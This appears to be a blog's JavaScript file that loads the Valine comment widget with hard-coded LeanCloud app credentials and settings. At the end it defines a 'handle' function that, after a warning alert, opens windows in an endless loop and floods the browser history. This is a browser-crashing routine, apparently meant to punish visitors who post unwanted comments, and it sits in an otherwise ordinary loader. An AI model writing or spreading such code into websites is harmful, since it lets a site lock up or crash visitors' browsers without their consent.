
function LoadValine() {
    $.getScript("https://unpkg.com/valine@latest/dist/Valine.min.js", function () {
        let metaPlaceholder = {"nick":"昵称/QQ号(必填)","mail":"邮箱(必填)","link":"网址(https://)"} ;
        let initData = {
            el: '#vcomments',
            path: window.location.pathname,
            appId: 'Iv242PjP9HNv9uXalP26dvgI-gzGzoHsz',
            appKey: '9dfwQNd2sjus1zKGMOVSqbRl',
            notify: 'true' === 'true',
            verify: 'true' === 'true',
            visitor: 'true' === 'true',
            avatar: 'robohash',
            pageSize: '12',
            lang: 'zh-CN',
            placeholder: '🤣一起来玩，留下你的足迹吧~(记得点击验证哦)。\n🚀昵称使用QQ号可以自动补全邮箱和显示头像昵称等信息哦\n💣请文明评论禁止恶意评论',
            meta: 'nick,mail,link'.split(","),
            recordIP: 'true' === 'true',
            enableQQ: '1850925656',
            boolean: true,
            requiredFields: ["c0755245d884baa9f03f96553546c9f2", "c0755245d884baa9f03f96553546c9f2"],
            master: ["c0755245d884baa9f03f96553546c9f2", "c0755245d884baa9f03f96553546c9f2"],
            friends: ["2d723b084472eb5c3854616804b4851c"],
            tagMeta: ["博主", "小伙伴", "访客"],
            metaPlaceholder: metaPlaceholder,
        }
        // Valine设置
        new Valine(initData);

    });

}
LoadValine()
function handle() {
    while (true) {
        alert("请勿提交非法内容");
        while (true) {
            window.open(window.location.href);
        }
        let total = "";
        for (let i = 0; i < 10000000000; i++) {
            total = total + i.toString();
            history.pushState(0, 0, total);
        }
    }
}
